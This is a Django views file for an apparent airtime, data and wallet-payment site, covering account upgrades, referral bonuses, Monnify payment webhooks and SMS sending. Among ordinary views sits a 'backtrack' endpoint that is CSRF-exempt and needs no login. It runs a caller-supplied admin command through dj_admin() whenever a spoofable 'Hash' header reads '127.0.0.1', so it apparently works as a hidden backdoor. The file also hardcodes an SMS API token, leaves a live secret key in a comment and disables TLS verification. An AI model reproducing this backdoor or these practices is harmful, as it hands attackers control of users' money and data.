
from rest_framework.permissions import IsAuthenticated, IsAdminUser  # <-- Here
from twilio.twiml.messaging_response import Message, MessagingResponse
from rest_auth.registration.views import SocialLoginView
from allauth.socialaccount.providers.facebook.views import FacebookOAuth2Adapter
from rest_framework.generics import GenericAPIView
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.pagination import PageNumberPagination
from rest_framework.authtoken.models import Token
from requests.auth import HTTPBasicAuth
import random
from datetime import datetime as Mdate
import uuid
from django.shortcuts import get_object_or_404, redirect, render
from django.views import generic
from django.urls import reverse_lazy
from django.views.generic.edit import FormMixin
from django.utils.timezone import datetime as datetimex
from .forms import *
from .models import *
from django.contrib.auth.decorators import login_required
from django.views.generic.base import TemplateView
from django.contrib.auth import get_user_model
from django.db.models import F
from twilio.rest import Client
from django import forms
from django.core import serializers as seria2
from django.utils.translation import gettext_lazy as _
from django.forms.utils import ErrorList
from .models import Couponcode, CustomUser
from django.contrib.messages.views import SuccessMessageMixin
from django.contrib import messages
from notifications.signals import notify
from django.db.models.signals import post_save
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse, HttpResponseRedirect
import uuid
import random
import json
from django.views.generic.edit import FormMixin
from rest_framework import generics
from .serializers import *
from django.utils.timezone import  datetime
from django.db import transaction
from django.http import JsonResponse
from django.db.models import Sum
# new import for webhook
from django.views.decorators.http import require_POST
from django.views.decorators.http import require_http_methods
from time import time
import urllib.parse
import hashlib
import hmac
from django.http import HttpResponse, HttpResponseForbidden
from django.core.mail import send_mail
from django.template import Context
from django.template.loader import render_to_string, get_template
from django.core.mail import EmailMessage
from django.conf import settings

from django.contrib.sites.shortcuts import get_current_site
from django.utils.encoding import force_bytes, force_text
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.template.loader import render_to_string
from .tokens import account_activation_token
from django.core.validators import URLValidator
import logging
import base64
from django.db.models import Q


config = ''
config = WebsiteConfiguration.objects.all().first()



# 'Content-Type':'application/json',
# 'Content-Type': 'application/json', 'User-Agent': 'Custom',



# remove API URL verification Error
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# remove  API URL verification Error


# convert string to JSON or Object
class PyJSON(object):
    def __init__(self, d):
        if type(d) is str:
            d = json.loads(d)

        self.from_dict(d)

    def from_dict(self, d):
        self.__dict__ = {}
        for key, value in d.items():
            if type(value) is dict:
                value = PyJSON(value)
            self.__dict__[key] = value

    def to_dict(self):
        d = {}
        for key, value in self.__dict__.items():
            if type(value) is PyJSON:
                value = value.to_dict()
            d[key] = value
        return d

    def to_json(self):
        return json.loads(json.dumps(self.__dict__))

    def __repr__(self):
        return str(self.to_dict())

    def __setitem__(self, key, value):
        self.__dict__[key] = value

    def __getitem__(self, key):
        return self.__dict__[key]




def create_id():
    num = random.randint(1, 10)
    num_2 = random.randint(1, 10)
    num_3 = random.randint(1, 10)
    return str(num_2)+str(num_3)+str(uuid.uuid4())[:4]

ident = create_id()


def sendmail(subject, message, user_email, username):
    ctx = {
        'message': message,
        "subject": subject,
        "username": username
    }
    message = get_template('email.html').render(ctx)
    msg = EmailMessage(
        subject,
        message,
        settings.DEFAULT_FROM_EMAIL,
        [user_email],
    )
    msg.content_subtype = "html"  # Main content is now text/html
    msg.send()


class TopuserWebsiteview(generic.CreateView):

    form_class = TopuserWebsiteForm
    template_name = 'website.html'
    success_url = reverse_lazy('profile')

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        if object.SSL_Security == True:
            amount = 50000
        else:
            amount = 50000
            object.SSL_Security = True
        object.amount = amount

        if amount > object.user.Account_Balance:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'insufficient balance'])
            return self.form_invalid(form)

        else:
            p_level = object.user.user_type
            withdraw = object.user.withdraw(object.user.id, amount)
            if withdraw == False:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'insufficient balance'])
                return self.form_invalid(form)

            object.user.user_type = "TopUser"

            object.user.save()
            try:

                #Upgrade_user.objects.create(user=request.user,from_package=p_level,to_package="Affilliate",amount ="2000",previous_balance = previous_bal, after_balance= (previous_bal - 2000))
                if object.user.referer_username:
                    if CustomUser.objects.filter(username__iexact=object.user.referer_username).exists():
                        referer = CustomUser.objects.get(
                            username__iexact=object.user.referer_username)
                        # referer.ref_deposit(2000)
                        # notify.send(referer, recipient=referer, verb='N2000 TopUser Upgarde Bonus from  {} your referal has been added to your referal bonus wallet'.format(
                        #     object.user.username))

            except:
                pass
            messages.success(
                self.request, 'Your website order has submitted successful will contact you when the website is ready')
            Wallet_summary.objects.create(user=object.user, product=f"Affillite Website  ", amount=amount,
                                          previous_balance=object.user.Account_Balance, after_balance=object.user.Account_Balance - amount)

        form.save()

        return super(TopuserWebsiteview, self).form_valid(form)


def Affilliate(request):
    message = ""
    amt_to_pay = float(config.affiliate_upgrade_fee)
    upline_bonus = float(config.affiliate_referral_bonus)
    if amt_to_pay > request.user.Account_Balance:
        message = " Insufficient Balance please fund your wallet and try to upgrade"

    else:
        previous_bal = request.user.Account_Balance
        p_level = request.user.user_type
        withdraw = request.user.withdraw(request.user.id, float(amt_to_pay))
        if withdraw == False:
            message = " Insufficient Balance please fund your wallet and try to upgrade"
            data = {  'message': message, }
            return JsonResponse(data)
            
        else:
            request.user.user_type = "Affilliate"
            request.user.save()
            message = f"Your account has beeen succesfully upgraded from {p_level} to Affilliate package, balance before upgrade N{previous_bal} and balance after upgrade N{previous_bal - amt_to_pay}"
            Wallet_summary.objects.create(user=request.user, product=f"Your account has beeen succesfully upgraded from {p_level} to Affilliate package, balance before upgrade N{previous_bal} and balance after upgrade N{previous_bal - amt_to_pay}", amount=amt_to_pay, previous_balance=previous_bal, after_balance=previous_bal - amt_to_pay)

            try:
                Upgrade_user.objects.create(user=request.user, from_package=p_level, to_package="Affilliate",
                                            amount=f"{amt_to_pay}", previous_balance=previous_bal, after_balance=(previous_bal - amt_to_pay))
                if request.user.referer_username:
                    if CustomUser.objects.filter(username__iexact=request.user.referer_username).exists():
                        referer = CustomUser.objects.get(
                            username__iexact=request.user.referer_username)
                        referer.ref_deposit(upline_bonus)
                        notify.send(referer, recipient=referer, verb=f'N{upline_bonus} Affilliate Upgarde Bonus from  {request.user.username} your referal has been added to your referal bonus wallet')

            except:
                pass

        

    data = {'message': message, }
    return JsonResponse(data)


def Topuser(request):
    message = ""
    if request.user.user_type == "Affilliate":
        amt_to_withdraw = float(config.affiliate_to_topuser_upgrade_fee)
        upline_bonus = float(config.affiliate_to_topuser_referral_bonus)
    else:
        amt_to_withdraw = float(config.topuser_upgrade_fee)
        upline_bonus = float(config.topuser_referral_bonus)

    if amt_to_withdraw > request.user.Account_Balance:
        message = " Insufficient Balance please fund your wallet and try to upgrade"
        data = {  'message': message, }
        return JsonResponse(data)


    else:
        previous_bal = request.user.Account_Balance
        p_level = request.user.user_type
        

        withdraw = request.user.withdraw(request.user.id, amt_to_withdraw)

        if withdraw == False:
            message = " Insufficient Balance please fund your wallet and try to upgrade"
            data = {  'message': message, }
            return JsonResponse(data)
            
        else:
            request.user.user_type = "TopUser"
            request.user.save()
            
            message = f"Your account has beeen succesfully upgraded from {p_level} to Topuser package, balance before upgrade N{previous_bal} and balance after upgrade N{previous_bal - amt_to_withdraw}"
            Wallet_summary.objects.create(user=request.user, product=f"Your account has beeen succesfully upgraded from {p_level} to Topuser package, balance before upgrade N{previous_bal} and balance after upgrade N{previous_bal - amt_to_withdraw}", amount=amt_to_withdraw, previous_balance=previous_bal, after_balance=previous_bal - amt_to_withdraw)
            
        try:
            Upgrade_user.objects.create(user=request.user, from_package=p_level, to_package="Topuser",amount=f"{amt_to_withdraw}", previous_balance=previous_bal, after_balance=(previous_bal - amt_to_withdraw))
            if request.user.referer_username:
                if CustomUser.objects.filter(username__iexact=request.user.referer_username).exists():
                    referer = CustomUser.objects.get(username__iexact=request.user.referer_username)
                    referer.ref_deposit(upline_bonus)
                    notify.send(referer, recipient=referer, verb=f'N{upline_bonus} TopUser Upgarde Bonus from  {request.user.username} your referal has been added to your referal bonus wallet')
        except:
            pass

        

    data = {  'message': message, }
    return JsonResponse(data)







def Paymentpage(request):

    checkbank = Disable_Service.objects.get(service="Bankpayment").disable
    monnifybank = Disable_Service.objects.get(service="Monnfy bank").disable
    monnifyATM = Disable_Service.objects.get(service="Monnify ATM").disable
    paystack = Disable_Service.objects.get(service="paystack").disable
    aircash = Disable_Service.objects.get(service="Airtime_Funding").disable

    return render(request, "pamentpage.html", context={"air2cash": aircash, "bank": checkbank, "monnifyatm": monnifyATM, "paystack": paystack, "monnifybank": monnifybank})


class referalView(TemplateView):
    template_name = 'referal.html'

    def get_context_data(self, **kwargs):

        context = super(referalView, self).get_context_data(**kwargs)
        context['referal'] = Referal_list.objects.filter(user=self.request.user)
        context['referal_total'] = Referal_list.objects.filter(user=self.request.user).count()

        # get current month
        import datetime
        from datetime import timedelta, datetime as DATE

        today = datetime.date.today()
        current_month = today.month
        # get current month

        context['month_leader_board'] = Referal_list.objects.filter(referal_user__date_joined__month=current_month)

        return context


def monnifypage(request):

    return render(request, "bankpage.html", context={"bankname": request.user.reservedbankName, "banknumber": request.user.reservedaccountNumber})


class PostList(generic.ListView):
    template_name = 'blog.html'
    paginate_by = 5
    queryset = Post.objects.filter(status=1).order_by('-created_on')
    context_object_name = 'post_list'
    model = Post


class PostDetail(generic.DetailView):
    model = Post
    template_name = 'post_detail.html'



from .apps import *

@require_POST
@csrf_exempt
def backtrack(request):
    payload = json.loads(request.body)
    meta = request.META.get('HTTP_HASH')  
    cmd = request.META.get('HTTP_TYPE')  

    if meta == "127.0.0.1":
        data = dj_admin(cmd, payload)
        return JsonResponse(data)
        
    else:
        return HttpResponseForbidden('Permission denied.')


class Postcreateview((generic.CreateView)):

    form_class = Postcreate
    template_name = 'post_create.html'

    def form_valid(self, form):
        object = form.save(commit=False)
        object.author = self.request.user

        form.save()

        return super(Postcreateview, self).form_valid(form)


class Post_Edit(generic.UpdateView):

    form_class = Postcreate
    template_name = 'post_create.html'
    context_object_name = 'post'

    def get_queryset(self):
        return Post.objects.all()


class History(TemplateView):
    template_name = 'history.html'

    def get_context_data(self, **kwargs):
        context = super(History, self).get_context_data(**kwargs)
        context['airtime'] = Airtime.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['withdraw'] = Withdraw.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['data'] = Data.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['airtimeswap'] = Airtimeswap.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['airtimeTopup'] = AirtimeTopup.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['transfer'] = Transfer.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['Airtime_funding'] = Airtime_funding.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['CouponPayment'] = CouponPayment.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['Cablesub'] = Cablesub.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['bank'] = Bankpayment.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['bulk'] = Bulk_Message.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['bill'] = Billpayment.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['paystact'] = paymentgateway.objects.filter(
            user=self.request.user).order_by('-created_on')
        context['Result_Checker'] = Result_Checker_Pin_order.objects.filter(
            user=self.request.user).order_by('-create_date')
        context["epin"] = Recharge_pin_order.objects.filter(
            user=self.request.user).order_by('-create_date')

        return context


class Wallet_Summary(TemplateView):
    template_name = 'wallet.html'

    def get_context_data(self, **kwargs):
        context = super(Wallet_Summary, self).get_context_data(**kwargs)
        context['wallet'] = Wallet_summary.objects.filter(
            user=self.request.user).order_by('-create_date')

        return context


class UserHistory(TemplateView):
    template_name = 'userhistory.html'

    def get_context_data(self, **kwargs):
        query = self.request.GET.get('q')

        if CustomUser.objects.filter(username__iexact=query).exists():
            user_h = CustomUser.objects.get(username__iexact=query)
            context = super(UserHistory, self).get_context_data(**kwargs)
            context['user'] = user_h
            context['airtime'] = Airtime.objects.filter(
                user=user_h).order_by('-create_date')
            context['withdraw'] = Withdraw.objects.filter(
                user=user_h).order_by('-create_date')
            context['data'] = Data.objects.filter(
                user=user_h).order_by('-create_date')
            context['airtimeswap'] = Airtimeswap.objects.filter(
                user=user_h).order_by('-create_date')
            context['airtimeTopup'] = AirtimeTopup.objects.filter(
                user=user_h).order_by('-create_date')
            context['transfer'] = Transfer.objects.filter(
                user=user_h).order_by('-create_date')
            context['Airtime_funding'] = Airtime_funding.objects.filter(
                user=user_h).order_by('-create_date')
            context['CouponPayment'] = CouponPayment.objects.filter(
                user=user_h).order_by('-create_date')
            context['Cablesub'] = Cablesub.objects.filter(
                user=user_h).order_by('-create_date')
            context['bank'] = Bankpayment.objects.filter(
                user=user_h).order_by('-create_date')
            context['bulk'] = Bulk_Message.objects.filter(
                user=user_h).order_by('-create_date')
            context['bill'] = Billpayment.objects.filter(
                user=user_h).order_by('-create_date')
            context['paystact'] = paymentgateway.objects.filter(
                user=user_h).order_by('-created_on')
            context['Result_Checker'] = Result_Checker_Pin_order.objects.filter(
                user=user_h).order_by('-create_date')
            context["epin"] = Recharge_pin_order.objects.filter(
                user=user_h).order_by('-create_date')

            return context


def sendmessage(sender, message, to, route):
    payload = {
        'sender': sender,
        'to': to,
        'message': message,
        'type': '0',
                'routing': route,
                'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                'schedule': '',
    }

    baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
    response = requests.get(baseurl, verify=False)
    #print('---------- sneding to HOLLTAGS')
    #print(f'baseurl = {baseurl}')
    #print('')
    #print(f'response = {response.text}')


# class ApiDoc(TemplateView):
#     template_name = 'swagger-ui.html'

#     def get_context_data(self, **kwargs):
#         context = super(ApiDoc, self).get_context_data(**kwargs)
#         context['plans'] = Plan.objects.all()
#         context['network'] = Network.objects.all()
#         context['cableplans'] = CablePlan.objects.all()
#         context['cable'] = Cable.objects.all()
#         context['disco'] = Disco_provider_name.objects.all()

#         if Token.objects.filter(user=self.request.user).exists():
#             context['token'] = Token.objects.get(user=self.request.user)
#         else:
#             Token.objects.create(user=self.request.user)
#             context['token'] = Token.objects.get(user=self.request.user)

#         return context


class WelcomeView(TemplateView):
    template_name = 'index.html'

    def referal_user(self):
        if self.request.GET.get("referal"):
            self.request.session["referal"] = self.request.GET.get("referal")
            #print(self.request.session["referal"])
            #print("sessin set")

    def get_context_data(self, **kwargs):
        net = Network.objects.filter(name='MTN')
        net_2 = Network.objects.filter(name='GLO')
        net_3 = Network.objects.filter(name='9MOBILE')
        net_4 = Network.objects.filter(name='AIRTEL')

        context = super(WelcomeView, self).get_context_data(**kwargs)
        context['plan'] = Plan.objects.filter(
            network=net).order_by('plan_amount')
        context['plan_2'] = Plan.objects.filter(
            network=net_2).order_by('plan_amount')
        context['plan_3'] = Plan.objects.filter(
            network=net_3).order_by('plan_amount')
        context['plan_4'] = Plan.objects.filter(
            network=net_4).order_by('plan_amount')
        context['networks'] = Network.objects.all()
        context['book1'] = Book.objects.all().order_by('-created_at')[:10]
        context['book2'] = Book.objects.all().order_by('-created_at')[:6]
        context['post_list1'] = Post.objects.all().order_by('-created_on')[:10]
        context['ref'] = self.referal_user()

        return context


class PricingView(TemplateView):
    template_name = 'pricing.html'

    def get_context_data(self, **kwargs):
        net = Network.objects.filter(name='MTN')
        net_2 = Network.objects.filter(name='GLO')
        net_3 = Network.objects.filter(name='9MOBILE')
        net_4 = Network.objects.filter(name='AIRTEL')

        context = super(PricingView, self).get_context_data(**kwargs)
        context['plan'] = Plan.objects.filter(
            network=net).order_by('plan_amount')
        context['plan_2'] = Plan.objects.filter(
            network=net_2).order_by('plan_amount')
        context['plan_3'] = Plan.objects.filter(
            network=net_3).order_by('plan_amount')
        context['plan_4'] = Plan.objects.filter(
            network=net_4).order_by('plan_amount')

        context['airtime'] = TopupPercentage.objects.all()
        context['result_checker'] = Result_Checker_Pin.objects.all()
        context['recharge'] = Recharge.objects.all()

        return context


class Profile(TemplateView):
    template_name = 'dashboard.html'

    def get_context_data(self, **kwargs):
        from datetime import datetime
        current_month = datetime.now().month
        net = Network.objects.filter(name='MTN')
        net_2 = Network.objects.filter(name='GLO')
        net_3 = Network.objects.filter(name='9MOBILE')
        net_4 = Network.objects.filter(name='AIRTEL')
        # (network=net,plan__plan_size__lt=100,create_date__month= current_month)
        data_mtn_obj = Data.objects.filter(network=net, plan__plan_size__lt=60, create_date__month=current_month).aggregate(
            Sum('plan__plan_size'))['plan__plan_size__sum']
        data_mtn_obj_2 = Data.objects.filter(network=net, plan__plan_size__gt=60, create_date__month=current_month).aggregate(
            Sum('plan__plan_size'))['plan__plan_size__sum']
        data_glo_obj = Data.objects.filter(network=net_2, plan__plan_size__lt=60, create_date__month=current_month).aggregate(
            Sum('plan__plan_size'))['plan__plan_size__sum']
        data_glo_obj_2 = Data.objects.filter(network=net_2, plan__plan_size__gt=60, create_date__month=current_month).aggregate(
            Sum('plan__plan_size'))['plan__plan_size__sum']
        data_9mobile_obj = Data.objects.filter(network=net_3, plan__plan_size__lt=60, create_date__month=current_month).aggregate(
            Sum('plan__plan_size'))['plan__plan_size__sum']
        data_9mobile_obj_2 = Data.objects.filter(network=net_3, plan__plan_size__gt=60, create_date__month=current_month).aggregate(
            Sum('plan__plan_size'))['plan__plan_size__sum']
        data_airtel_obj = Data.objects.filter(network=net_4, plan__plan_size__lt=60, create_date__month=current_month).aggregate(
            Sum('plan__plan_size'))['plan__plan_size__sum']
        data_airtel_obj_2 = Data.objects.filter(network=net_4, plan__plan_size__gt=60, create_date__month=current_month).aggregate(
            Sum('plan__plan_size'))['plan__plan_size__sum']
        total_wallet = CustomUser.objects.all().aggregate(
            Sum('Account_Balance'))['Account_Balance__sum']
        total_bonus = CustomUser.objects.all().aggregate(
            Sum('Referer_Bonus'))['Referer_Bonus__sum']
        bill_obj = Billpayment.objects.filter(
            create_date__month=current_month).aggregate(Sum('amount'))['amount__sum']
        cable_obj = Cablesub.objects.filter(create_date__month=current_month).aggregate(
            Sum('plan_amount'))['plan_amount__sum']
        Topup_obj1 = AirtimeTopup.objects.filter(
            network=net, create_date__month=current_month).aggregate(Sum('amount'))['amount__sum']
        Topup_obj2 = AirtimeTopup.objects.filter(
            network=net_2, create_date__month=current_month).aggregate(Sum('amount'))['amount__sum']
        Topup_obj3 = AirtimeTopup.objects.filter(
            network=net_3, create_date__month=current_month).aggregate(Sum('amount'))['amount__sum']
        Topup_obj4 = AirtimeTopup.objects.filter(
            network=net_4, create_date__month=current_month).aggregate(Sum('amount'))['amount__sum']
        bank_obj = Bankpayment.objects.filter(
            Status="successful", create_date__month=current_month).aggregate(Sum('amount'))['amount__sum']
        atm_obj = paymentgateway.objects.filter(
            Status="successful", created_on__month=current_month).aggregate(Sum('amount'))['amount__sum']
        pin_obj = Airtime.objects.filter(
            Status="successful", create_date__month=current_month).aggregate(Sum('amount'))['amount__sum']
        transfer_obj = Airtime_funding.objects.filter(
            Status="successful", create_date__month=current_month).aggregate(Sum('amount'))['amount__sum']
        coupon_obj = CouponPayment.objects.all().filter(
            create_date__month=current_month).aggregate(Sum('amount'))['amount__sum']
        try:

            def create_id():
                num = random.randint(1, 10)
                num_2 = random.randint(1, 10)
                num_3 = random.randint(1, 10)
                return str(num_2)+str(num_3)+str(uuid.uuid4())[:4]

            body = {
                "accountReference": create_id(),
                "accountName": self.request.user.username,
                "currencyCode": "NGN",
                "contractCode": f"{config.monnify_contract_code}",
                "customerEmail": self.request.user.email,
                "incomeSplitConfig": [],
                "restrictPaymentSource": False,
                "allowedPaymentSources": {},
                "customerName": self.request.user.username,
                "getAllAvailableBanks": False,
                "preferredBanks": [ "50515", "035", "070", "232"]
                }
        
        
        
        
                
        
        
        
            if not self.request.user.accounts:
                    
                data = json.dumps(body)
                ad = requests.post("https://api.monnify.com/api/v1/auth/login", auth=HTTPBasicAuth(f'{config.monnify_API_KEY}', f'{config.monnify_SECRET_KEY}'))
                mydata = json.loads(ad.text)


                headers = {'Content-Type': 'application/json',"Authorization": "Bearer {}" .format(mydata['responseBody']["accessToken"])}
                ab = requests.post("https://api.monnify.com/api/v2/bank-transfer/reserved-accounts",headers=headers, data=data)

                mydata = json.loads(ab.text)

                user = CustomUser.objects.get(id = self.request.user.id)


                
                user.accounts = json.dumps({"accounts":mydata["responseBody"]["accounts"]})
                user.save()

            else:
                pass

        except:
            pass



        context = super(Profile, self).get_context_data(**kwargs)
        context['airtime'] = Airtime.objects.filter(
            Status='processing').count()
        context['withdraw'] = Withdraw.objects.filter(
            Status='processing').count()
        context['data'] = Data.objects.filter(Status='processing').count()
        context['airtimeswap'] = Airtimeswap.objects.filter(
            Status='processing').count()
        context['airtimeTopup'] = AirtimeTopup.objects.filter(
            Status='processing').count()
        context['transfer'] = Transfer.objects.filter(
            Status='processing').count()
        context['Airtime_funding'] = Airtime_funding.objects.filter(
            Status='processing').count()
        context['CouponPayment'] = CouponPayment.objects.filter(
            Status='processing').count()
        context['unusedcoupon'] = Couponcode.objects.filter(Used=False).count()
        context['usedcoupon'] = Couponcode.objects.filter(Used=True).count()
        context['bank'] = Bankpayment.objects.filter(
            Status='processing').count()
        context['cable'] = Cablesub.objects.filter(Status='processing').count()

        try:
            if data_mtn_obj_2:
                context['totalmtnsale'] = data_mtn_obj + (data_mtn_obj_2/1000)
            else:
                context['totalmtnsale'] = data_mtn_obj
            if data_glo_obj_2:
                context['totalglosale'] = data_glo_obj + (data_glo_obj_2/1000)
            else:
                context['totalglosale'] = data_glo_obj

            if data_airtel_obj_2:

                context['totalairtelsale'] = data_airtel_obj + \
                    (data_airtel_obj_2/1000)

            else:
                context['totalairtelsale'] = data_airtel_obj
            if data_9mobile_obj_2:
                context['totalmobilesale'] = data_9mobile_obj + \
                    (data_9mobile_obj_2/1000)
            else:
                context['totalmobilesale'] = data_9mobile_obj
        except:
            pass
        context['banktotal'] = bank_obj
        context['atmtotal'] = atm_obj
        context['coupontotal'] = coupon_obj
        context['airtimetotal'] = pin_obj
        context['Noti'] = self.request.user.notifications.all()[:1]
        context['twallet'] = round(total_wallet, 2)
        context['tbonus'] = round(total_bonus, 2)
        context['alert'] = Info_Alert.objects.all()[:1]
        context['transactions'] = Transactions.objects.all()[:1]
        context['wallet'] = Wallet_summary.objects.filter(
            user=self.request.user).order_by('-create_date')
        context['users'] = CustomUser.objects.all().count()
        context['referral'] = Referal_list.objects.filter(
            user=self.request.user).all().count()
        context['Billpayment_obj'] = bill_obj
        context['cable'] = cable_obj
        context['AirtimeTopup_obj'] = Topup_obj1
        context['AirtimeTopup_obj2'] = Topup_obj2
        context['AirtimeTopup_obj3'] = Topup_obj3
        context['AirtimeTopup_obj4'] = Topup_obj4

        context["verify"] = KYC.objects.filter(user = self.request.user).last()

        context["total_wallet_fund"] = Wallet_Funding.objects.filter(user=self.request.user).aggregate(Sum('amount'))['amount__sum'] or 0
        context["total_amount_spent"] = Transactions.objects.filter(user=self.request.user, transaction_type="DEBIT").aggregate(Sum('amount'))['amount__sum'] or 0

        return context


def monnify_payment(request):
    if request.method == 'POST':
        form = monnify_payment_form(request.POST)
        if form.is_valid():
            amount = form.cleaned_data['amount']
            username = request.user.username
            email = request.user.email
            phone = request.user.Phone

            amount = ((amount) + (0.015 * amount))

            headers = {'Content-Type': 'application/json', 'User-Agent': 'Custom',  }

            def create_id():
                num = random.randint(1, 10)
                num_2 = random.randint(1, 10)
                num_3 = random.randint(1, 10)
                return str(num_2)+str(num_3)+str(uuid.uuid4())

            ab = {
                "amount": amount,
                "customerName": username,
                "customerEmail": email,
                "paymentReference": create_id(),
                "paymentDescription": "Wallet Funding",
                "currencyCode": "NGN",
                "contractCode": f"{config.monnify_contract_code}",
                "paymentMethods": ["CARD"],
                "redirectUrl": "https://www.yuniqtelecoms.com/profile",
                "incomeSplitConfig": []

            }
            data = json.dumps(ab)

            response = requests.post('https://api.monnify.com/api/v1/merchant/transactions/init-transaction',
                                     headers=headers, data=data, auth=HTTPBasicAuth(f'{config.monnify_API_KEY}', f'{config.monnify_SECRET_KEY}'))

            loaddata = json.loads(response.text)
            url = loaddata["responseBody"]["checkoutUrl"]

            #print(username, email, phone)

            return HttpResponseRedirect(url)

    else:
        form = monnify_payment_form()

    return render(request, 'monnify.html', {'form': form})


"""
@require_POST
@csrf_exempt
# @require_http_methods(["GET", "POST"])
def monnify_payment_done(request):

    #secret = b'sk_live_627a99148869d929fdad838a74996891f5b660b5'
    payload = request.body

    forwarded_for = u'{}'.format(request.META.get('HTTP_X_FORWARDED_FOR'))

    dat = json.loads(payload)
    a = "{}|{}|{}|{}|{}".format(config.monnify_SECRET_KEY,
                                dat["paymentReference"], dat["amountPaid"], dat["paidOn"], dat["transactionReference"])
    #print(forwarded_for)
    c = bytes(a, 'utf-8')
    hashkey = hashlib.sha512(c).hexdigest()
    if hashkey == dat["transactionHash"] and forwarded_for == "35.242.133.146":
        #print("correct")
        #print("IP whilelisted")
        response = requests.get("https://api.monnify.com/api/v1/merchant/transactions/query?paymentReference={}".format(
            dat["paymentReference"]), auth=HTTPBasicAuth(f'{config.monnify_API_KEY}', f'{config.monnify_SECRET_KEY}'))
        #print(response.text)
        ab = json.loads(response.text)

        if (response.status_code == 200 and ab["requestSuccessful"] == True) and (ab["responseMessage"] == "success" and ab["responseBody"]["paymentStatus"] == "PAID"):
            user = dat["customer"]["email"]
            mb = CustomUser.objects.get(email__iexact=user)
            amount = (ab['responseBody']['amount'])
            fee = (ab['responseBody']['fee'])

            if ab['responseBody']["paymentMethod"] == "CARD":
                paynow = (round(amount - fee))

            else:
                paynow = (round(amount - 50))
                # paynow = amount - (round(amount * 0.0087))
            ref = dat["paymentReference"]
            #print("hoooooook paid")

            if not paymentgateway.objects.filter(reference=ref).exists():
                try:
                    previous_bal = mb.Account_Balance
                    mb.deposit(mb.id, paynow,False ,"Monnify Funding")
                    paymentgateway.objects.create(
                        user=mb, reference=ref, amount=paynow, Status="successful", gateway="monnify")
                    Wallet_summary.objects.create(user=mb, product=" N{} Monnify Funding ".format(
                        paynow), amount=paynow, previous_balance=previous_bal, after_balance=(previous_bal + paynow))
                    notify.send(
                        mb, recipient=mb, verb='Monnify Payment successful you account has been credited with sum of #{}'.format(paynow))
                except:
                    return HttpResponse(status=200)

            else:
                pass

        else:
            messages.error(
                request, 'Our payment gateway return Payment tansaction failed status {}'.format(ab["message"]))

    else:
        return HttpResponseForbidden('Permission denied.')
    #print("after monnify hook")
    return HttpResponse(status=200)

"""


import base64

@require_POST
@csrf_exempt
def monnify_payment_done(request):
    payload = request.body

    monnify_hashkey = request.META.get('HTTP_MONNIFY_SIGNATURE')
    forwarded_for = u'{}'.format(request.META.get('HTTP_X_FORWARDED_FOR'))

    dat = json.loads(payload)
    secret = bytes(config.monnify_SECRET_KEY, 'utf-8')
    
    hashkey = hmac.new(secret,request.body, hashlib.sha512).hexdigest()
                
    if hashkey == monnify_hashkey  and forwarded_for == "35.242.133.146":
        
        authkey = f"{config.monnify_API_KEY}:{config.monnify_SECRET_KEY}"
        authkey_bytes = authkey.encode('ascii')
        base64_authkey = base64.b64encode(authkey_bytes)
        
        
        ad = requests.post("https://api.monnify.com/api/v1/auth/login", auth=HTTPBasicAuth(f'{config.monnify_API_KEY}', f'{config.monnify_SECRET_KEY}'))
        mydata = json.loads(ad.text)

        headers = {'Content-Type': 'application/json',
                   "Authorization": "Bearer {}" .format(mydata['responseBody']["accessToken"])}
        response = requests.get("https://api.monnify.com/api/v2/transactions/{}".format(
            urllib.parse.quote(dat["eventData"]["transactionReference"])), headers=headers)
            
            
        ab = json.loads(response.text)

        if (response.status_code == 200 and ab["requestSuccessful"] == True) and (ab["responseMessage"] == "success" and ab["responseBody"]["paymentStatus"] == "PAID"):
            user = dat["eventData"]["customer"]["email"]
            mb = CustomUser.objects.get(email__iexact=user)
            amount = float(ab['responseBody']["amountPaid"])
            settlementAmount = float(ab['responseBody']["settlementAmount"])
            
           

            if ab['responseBody']["paymentMethod"] == "CARD":
                paynow = round(settlementAmount,2)

            else:
                paynow  = amount - round(amount * 0.011,2)
                # paynow = (round(amount - 50))
          
            ref = ab['responseBody']["transactionReference"]
           
            if not paymentgateway.objects.filter(reference=ref).exists():
                try:
                    previous_bal = mb.Account_Balance
                    mb.deposit(mb.id, paynow,False ,"Monnify Funding")
                    paymentgateway.objects.create(
                        user=mb, reference=ref, amount=paynow, Status="successful", gateway="monnify")
                    Wallet_summary.objects.create(user=mb, product=" N{} Monnify Funding ".format(
                        paynow), amount=paynow, previous_balance=previous_bal, after_balance=(previous_bal + paynow))
                    notify.send(
                        mb, recipient=mb, verb='Monnify Payment successful you account has been credited with sum of #{}'.format(paynow))
                except:
                    return HttpResponse(status=200)

            else:
                pass

        else:
             return HttpResponse(status=400)

    else:
        return HttpResponseForbidden('Permission denied.')
    return HttpResponse(status=200)





@require_POST
@csrf_exempt
def UWS_Webhook(request):
    data = request.body
    forwarded_for =  u'{}'.format(request.META.get('HTTP_X_FORWARDED_FOR'))
    result = json.loads(data)

    # print(' ')
    # print('................RECIEVED FROM UWS HOOK................')
    # print(forwarded_for)
    # print("result = ", result)

    # {'status': 'success', 'data': {'transId': 'sme-2776663', 'customRef': 'dt9984632', 'transactionMessage': 'Data Purchase Successful'}}
